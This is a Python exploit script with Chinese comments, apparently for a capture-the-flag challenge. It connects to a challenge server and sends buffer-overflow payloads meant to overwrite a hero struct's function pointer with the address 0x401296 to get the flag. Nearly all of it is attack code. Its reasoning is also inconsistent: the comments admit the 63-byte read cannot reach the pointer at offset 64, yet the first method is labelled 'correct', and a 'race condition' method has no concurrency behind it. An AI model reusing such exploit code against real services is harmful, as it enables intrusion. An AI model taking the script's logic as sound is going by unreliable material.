#!/usr/bin/env python3
"""
正确的exploit - 基于IDA反汇编分析
发现：read(0, current_hero, 0x3FuLL) 读取63字节到整个结构体
函数指针在偏移64处设置，我们需要覆盖到偏移62-63附近
"""

import socket
import struct

def connect_remote():
    """连接到远程服务器"""
    host = "night-of-the-living-dead.chall.edgesecurity.team"
    port = 1343
    
    print(f"[+] 连接到 {host}:{port}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    return s

def recv_until(s, pattern):
    """接收数据直到遇到指定模式"""
    data = b""
    while pattern not in data:
        data += s.recv(1)
    return data

def exploit_correct():
    """基于IDA分析的正确exploit"""
    unlock_secret_level_addr = 0x401296
    
    s = connect_remote()
    
    try:
        recv_until(s, b"Choice: ")
        
        print("[+] 创建Hero并利用read溢出")
        s.send(b"1\n")
        recv_until(s, b"Enter hero name: ")
        
        # 关键发现：read(0, current_hero, 0x3F) 
        # 读取63字节到current_hero开头，函数指针在偏移64
        # 我们需要构造payload让地址出现在正确位置
        
        # 策略：用63字节精确覆盖到偏移62，希望影响函数指针设置
        # 让地址的部分字节出现在偏移56-63范围内
        
        payload = b"A" * 56  # 填充56字节
        payload += struct.pack("<Q", unlock_secret_level_addr)[:7]  # 7字节地址，总共63字节
        
        print(f"[+] 发送payload长度: {len(payload)} 字节")
        print(f"[+] 目标地址: 0x{unlock_secret_level_addr:x}")
        
        s.send(payload)
        
        hero_info = recv_until(s, b"Choice: ")
        print(f"[+] Hero创建: {hero_info.decode()}")
        
        # 执行攻击
        print("[+] 执行攻击")
        s.send(b"3\n")
        
        result = s.recv(4096)
        print(f"[+] 攻击结果: {result.decode()}")
        
        if b"debug print" in result or b"flag" in result.lower():
            print("[SUCCESS] 获取到flag!")
            return True
        else:
            return False
            
    except Exception as e:
        print(f"[-] 错误: {e}")
        return False
    finally:
        s.close()

def exploit_race_condition():
    """利用竞态条件 - 在函数指针设置前覆盖"""
    unlock_secret_level_addr = 0x401296
    
    s = connect_remote()
    
    try:
        recv_until(s, b"Choice: ")
        s.send(b"1\n")
        recv_until(s, b"Enter hero name: ")
        
        # 尝试在read和函数指针设置之间的竞态
        # 让地址字节出现在关键位置
        payload = b"B" * 55
        payload += b"\x96\x12\x40\x00\x00\x00\x00\x00"  # 直接写入地址字节
        payload = payload[:63]  # 确保63字节
        
        print(f"[+] 竞态利用payload: {len(payload)} 字节")
        s.send(payload)
        
        recv_until(s, b"Choice: ")
        s.send(b"3\n")
        
        result = s.recv(4096)
        print(f"[+] 竞态结果: {result.decode()}")
        
        return b"debug print" in result
        
    except Exception as e:
        print(f"[-] 竞态错误: {e}")
        return False
    finally:
        s.close()

def exploit_partial_overwrite():
    """部分覆盖exploit"""
    unlock_secret_level_addr = 0x401296
    
    s = connect_remote()
    
    try:
        recv_until(s, b"Choice: ")
        s.send(b"1\n")
        recv_until(s, b"Enter hero name: ")
        
        # 尝试部分覆盖：假设函数指针低位可以被影响
        # normal_attack地址可能很接近，我们只需要改变低位
        
        # 填充到接近函数指针位置
        payload = b"C" * 60  
        payload += b"\x96\x12\x40"  # unlock_secret_level的地址低3字节
        
        print(f"[+] 部分覆盖payload: {len(payload)} 字节") 
        s.send(payload)
        
        recv_until(s, b"Choice: ")
        s.send(b"3\n")
        
        result = s.recv(4096)
        print(f"[+] 部分覆盖结果: {result.decode()}")
        
        return b"debug print" in result
        
    except Exception as e:
        print(f"[-] 部分覆盖错误: {e}")
        return False
    finally:
        s.close()

if __name__ == "__main__":
    print("基于IDA分析的正确Exploit")
    print(f"[+] 发现: read(0, current_hero, 0x3F) 到整个结构体")
    print(f"[+] 函数指针在偏移64处设置")
    print(f"[+] unlock_secret_level地址: 0x401296")
    
    methods = [
        ("正确exploit", exploit_correct),
        ("竞态条件", exploit_race_condition),
        ("部分覆盖", exploit_partial_overwrite)
    ]
    
    for method_name, method_func in methods:
        print(f"\n[+] 尝试 {method_name}...")
        if method_func():
            print(f"[SUCCESS] {method_name} 成功获取flag!")
            break
        else:
            print(f"[-] {method_name} 失败")
    else:
        print("[-] 需要进一步分析...")